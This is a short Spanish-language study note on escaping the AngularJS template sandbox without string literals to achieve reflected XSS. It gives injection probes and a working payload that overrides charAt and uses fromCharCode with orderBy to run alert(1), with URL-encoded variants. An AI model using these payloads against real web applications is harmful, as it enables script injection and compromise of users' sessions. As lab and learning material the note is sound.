# Escape de sandbox Angular JS sin cadenas 

Tags: #XSS #AngularJS #JavaScript #XSS-Reflected 

* [Angular Portswigger Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

```javascript 
// Angular permitía {{user.name}} -> HTML (sandbox)
-> window, document, Function, eval, etc...
-> __proto__, constructor
-> propiedades accesibles

// Para qué sirve?
1. Evitar inyecciones de codigo en plantillas 
2. Proteger al usuario de ejecuciones mal intencionadas de código
3. Mantener aislado el scope para que no escape al entorno global 
```

```javascript 
- Verificar si el campo es inyectable:

	<script>alert(0)</script>
	<h1>Hi</h1>
	<marquee>Hi</marquee>
	<img src=0 onerror=alert(0)>
```

```javascript 
// Identificar la versión de Angula JS. Esto puede ser desde la consola de la web o con Wappalyzer
❯ angular.version.full 

	test&1+1
	test&1%2b1
		'+' = %2b urlencodeado

	test&toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)

	test&toString().constructor.prototype.charAt%3d[].join; [1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
		'=' = %3d urlencodeado
		120 61 97 108 101 114 116 40 49 41 = 'x=alert(1)'

Notas:
	1. Si se quiere colocar directamente un {{alert(0)}}, Angular JS lo bloquea para evitar XSS
	2. Los numeros estan en decimal, por lo que si se quiere saber o escribir se deben de convertir a ASCII
	3. '$Parce' es quien evalua las expresiones 
```